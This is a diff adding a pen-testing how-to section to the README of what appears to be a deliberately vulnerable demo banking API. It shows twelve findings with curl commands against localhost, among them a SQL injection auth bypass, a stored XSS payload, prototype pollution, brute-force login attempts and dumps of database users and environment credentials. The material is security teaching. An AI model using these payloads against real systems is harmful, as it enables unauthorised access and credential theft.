@@ -383,3 +383,198 @@ POST /api/transactions/send
 - Database users given scoped permissions
 
 ## Pen testing (How-to)
+
+## 1. Plaintext Password Storage
+
+* **Vulnerability:** Sensitive data (password) exposed in API response.
+* **Command:**
+    ```bash
+    curl -s -X POST "http://localhost:8000/api/auth/insecure/register" \
+      -H "Content-Type: application/json" \
+      --data '{"name":"demo_pw","email":"demo_pw@example.local","username":"demo_pw","password":"secretpw"}'
+    ```
+* **Returns:** <img width="1983" height="150" alt="image" src="https://github.com/user-attachments/assets/046fa96c-e136-4be4-9448-33f526a37b06" />
+<img width="954" height="1338" alt="image" src="https://github.com/user-attachments/assets/274fc213-6873-4ebe-9f7b-20f28c2e6ae0" />
+<img width="1434" height="1137" alt="image" src="https://github.com/user-attachments/assets/34d61a2e-ae13-4d9e-87ad-e065fa8283e8" />
+
+
+* **Analysis:** The user's plaintext password (`secretpw`) appears unmasked in the API response after registration.  This is a severe risk, as any observer (e.g., sniffing network traffic, server logs) can immediately steal the password.
+
+---
+
+## 2. Login via GET (Credential Leakage)
+
+* **Vulnerability:** Transmission of credentials in URL query parameters.
+* **Command:**
+    ```bash
+    curl "http://localhost:8000/api/auth/insecure/login?email=demo_pw@example.local&password=secretpw"
+    ```
+* **Returns:** <img width="2334" height="306" alt="image" src="https://github.com/user-attachments/assets/ceb88c05-1d76-4e8f-87a4-2e5036086554" />
+<img width="1794" height="459" alt="image" src="https://github.com/user-attachments/assets/783f1ef8-023a-4237-8b7f-599d9c65edea" />
+
+* **Analysis:** Credentials submitted via a **GET** request appear directly in the **URL query parameters**. This causes them to be logged in browser history, web server logs, and potentially network logs, leading to **credential leakage**.
+
+---
+
+## 3. IDOR – Direct Account Access
+
+* **Vulnerability:** **Insecure Direct Object Reference (IDOR)** on account data.
+* **Command:**
+    ```bash
+    curl "http://localhost:8000/api/accounts/insecure/1"
+    ```
+* **Browser:**
+    ```javascript
+    fetch("http://localhost:8000/api/accounts/insecure/1").then(r=>r.json()).then(console.log)
+    ```
+* **Returns:** <img width="2334" height="903" alt="image" src="https://github.com/user-attachments/assets/b1eb0d0d-a593-4cb1-af51-4912d3a8dc04" />
+<img width="2355" height="174" alt="image" src="https://github.com/user-attachments/assets/65e924ee-5f77-48ec-8b56-4ce4cdf43763" />
+
+
+* **Analysis:** The application uses a simple sequential ID (`1`) in the API endpoint.  **Any user ID** is accessible without proper **authorization checks**, allowing an attacker to enumerate and view other users' private account data by simply changing the ID.
+
+---
+
+## 4. SQL Injection – Auth Bypass
+
+* **Vulnerability:** **SQL Injection** for authentication bypass.
+* **Command:**
+    ```bash
+    curl -s "http://localhost:8000/api/auth/insecure/login?email=%27%20OR%20%271%27=%271%27%20--%20&password=foo"
+    ```
+* **Returns:** <img width="2340" height="90" alt="image" src="https://github.com/user-attachments/assets/88cf559e-9c50-4d87-911e-7fc93f32af6c" />
+<img width="1383" height="1038" alt="image" src="https://github.com/user-attachments/assets/1fd1a504-b4a4-4591-b562-ef9ec1229ae0" />
+<img width="2343" height="246" alt="image" src="https://github.com/user-attachments/assets/6bdd4fc3-5f5e-4e83-83ce-a803c1dd9bd8" />
+
+* **Analysis:** The injected string `%27%20OR%20%271%27=%271%27%20--%20` (equivalent to `' OR '1'='1' -- `) manipulates the server's SQL query.  This bypasses authentication by creating a perpetually **TRUE** condition in the `WHERE` clause, logging the attacker in without valid credentials.
+
+---
+
+## 5. Stored XSS – Malicious Name Input
+
+* **Vulnerability:** **Stored Cross-Site Scripting (XSS)** via user registration.
+* **Command:**
+    ```bash
+    curl -s -X POST "http://localhost:8000/api/auth/insecure/register" \
+      -H "Content-Type: application/json" \
+      --data '{"name":"<script>alert(`XSS`)</script>","email":"xss@example.local","username":"xss","password":"PwD!1234"}'
+    ```
+* **Returns:** <img width="2349" height="102" alt="image" src="https://github.com/user-attachments/assets/567a0dda-e2c0-4510-abb6-31100820241a" />
+<img width="1095" height="756" alt="image" src="https://github.com/user-attachments/assets/195112b5-e06d-488c-883f-f53796236add" />
+<img width="1218" height="609" alt="image" src="https://github.com/user-attachments/assets/907e6124-0d13-4fec-9595-2e7c3a44737a" />
+<img width="2334" height="441" alt="image" src="https://github.com/user-attachments/assets/bde46cc8-2f75-4fc7-bd83-2e5ac6dbcd4e" />
+
+
+* **Analysis:** The application fails to properly sanitize or escape the **name field**. A malicious script is stored in the database and executes whenever a user views a page that renders the name, leading to a **Stored XSS** vulnerability.
+
+---
+
+## 6. Insecure Deserialization / Prototype Pollution
+
+* **Vulnerability:** **Insecure Deserialization** leading to **Prototype Pollution**.
+* **Command:**
+    ```bash
+    curl -s -X POST "http://localhost:8000/api/auth/insecure/deserialize" \
+      -H "Content-Type: application/json" \
+      --data '{"__proto__": {"isAdmin": true}}'
+    ```
+* **Returns:** <img width="2343" height="108" alt="image" src="https://github.com/user-attachments/assets/9c2395f7-16ed-4dec-a3de-c7f691b76ba2" />
+
+* **Analysis:** The endpoint uses an insecure deserialization method, allowing the attacker to inject the `__proto__` property. This can **pollute global object prototypes** in JavaScript environments, potentially escalating privileges (e.g., making all users administrators) or causing denial of service.
+
+---
+
+## 7. No Session Token After Login
+
+* **Vulnerability:** Missing **Session Management** implementation.
+* **Command:**
+    ```bash
+    curl -s -X POST http://localhost:8000/api/auth/insecure/login \
+      -H "Content-Type: application/json" \
+      --data '{"username":"demo_pw","password":"secretpw"}'
+    ```
+* **Returns:**  <img width="2337" height="117" alt="image" src="https://github.com/user-attachments/assets/5d659c3b-94de-4c89-afc7-2cee5fc8b646" />
+<img width="846" height="543" alt="image" src="https://github.com/user-attachments/assets/d3ef0afc-86cf-4731-bc27-773bb60338ef" />
+<img width="1671" height="684" alt="image" src="https://github.com/user-attachments/assets/fd137c9e-12d4-485d-b4fb-6af51bc70b7c" />
+
+* **Analysis:** No **JWT**, **cookies**, or other session-related data (e.g., token, session ID) is returned in the API response after a successful login, indicating a lack of proper session state management.
+
+---
+
+## 8. Brute Force – No Rate Limit
+
+* **Vulnerability:** Lack of **Rate Limiting** on the login endpoint.
+* **Command:**
+    ```bash
+    for i in {1..10}; do
+      curl -s -X POST http://localhost:8000/api/auth/insecure/login \
+        -H "Content-Type: application/json" \
+        --data '{"username":"demo_pw","password":"wrong"}' > /dev/null
+    done
+    ```
+
+ * **Returns:**   <img width="2334" height="330" alt="image" src="https://github.com/user-attachments/assets/27b2faaa-97b4-4eb0-9aee-6d000f4fe790" />
+<img width="1524" height="501" alt="image" src="https://github.com/user-attachments/assets/69308744-a300-45a4-8147-5aebc1fbb85d" />
+<img width="1395" height="585" alt="image" src="https://github.com/user-attachments/assets/7ff99375-0b32-4fac-ae03-d22ba578bc7f" />
+
+* **Analysis:** The login endpoint allows for an **unlimited number of password attempts** in a short period without any **rate limit**, **throttle**, or **account lockout** mechanism, making it trivial to perform a **brute-force attack**.
+
+---
+
+## 9. Misconfigured CORS
+
+* **Vulnerability:** **Misconfigured Cross-Origin Resource Sharing (CORS)**.
+* **Command:**
+    ```bash
+    curl -i "http://localhost:8000/api/accounts/insecure/1"
+    ```
+
+  * **Returns:**  <img width="2337" height="561" alt="image" src="https://github.com/user-attachments/assets/8a5c73c2-0617-404a-a721-ae0346a8bb10" />
+<img width="2334" height="1008" alt="image" src="https://github.com/user-attachments/assets/d06ee5ce-0190-412d-a1bd-5c2d3573dfbd" />
+
+* **Analysis:** (Based on command, expect analysis to show a permissive `Access-Control-Allow-Origin` header like `*`) A misconfigured CORS policy, likely using a wildcard (`*`), allows any external domain to make authenticated requests to the API.
+
+---
+
+## 10. Weak Logging with Morgan
+
+* **Vulnerability:** Insecure logging (often storing sensitive data).
+* **Command:**
+    ```bash
+    curl -X POST http://localhost:8000/api/auth/insecure/login \
+      -H "Content-Type: application/json" \
+      --data '{"username":"admin","password":"wrong"}'
+    ```
+
+  * **Returns:**   <img width="2331" height="81" alt="image" src="https://github.com/user-attachments/assets/3792a3de-a6dc-45ff-9eac-36b476d43927" />
+<img width="2334" height="546" alt="image" src="https://github.com/user-attachments/assets/d481d6ec-e78f-40bf-adcc-0435fa36b773" />
+
+* **Analysis:** Logging middleware (e.g., Morgan in Express.js) is configured to log the **full request body**, including the attempted password (`wrong`). This leaks sensitive user data into server logs.
+
+---
+
+## 11. Direct DB Dump
+
+* **Vulnerability:** Unprotected internal database access.
+* **Command:**
+    ```bash
+    docker exec -it bluepeak-db psql -U user123 -d db123 -c \
+    "SELECT userid, name, email, password FROM users;"
+    ```
+
+ * **Returns:**    <img width="2331" height="630" alt="image" src="https://github.com/user-attachments/assets/0863add5-d6d5-4bec-8649-0d6f35252af4" />
+
+* **Analysis:** The database container is directly accessible using its internal name (`bluepeak-db`) and weak, known credentials (`user123`/`db123`). This allows an attacker with container access to perform a **direct dump of all user data**, including **unhashed passwords** (based on finding #1).
+
+---
+
+## 12. Dumping Environment Variables
+
+* **Vulnerability:** Sensitive data stored in environment variables.
+* **Command:**
+    ```bash
+    docker exec -it bluepeak-db env | grep POSTGRES
+    ```
+  * **Returns:**  <img width="2325" height="351" alt="image" src="https://github.com/user-attachments/assets/f3850ac8-4342-4d46-a840-8a9117de22ff" />
+
+* **Analysis:** Environment variables, such as **database credentials** (`POSTGRES_USER`, `POSTGRES_PASSWORD`), are exposed within the running Docker container. This is a common security oversight that provides attackers with internal secrets.
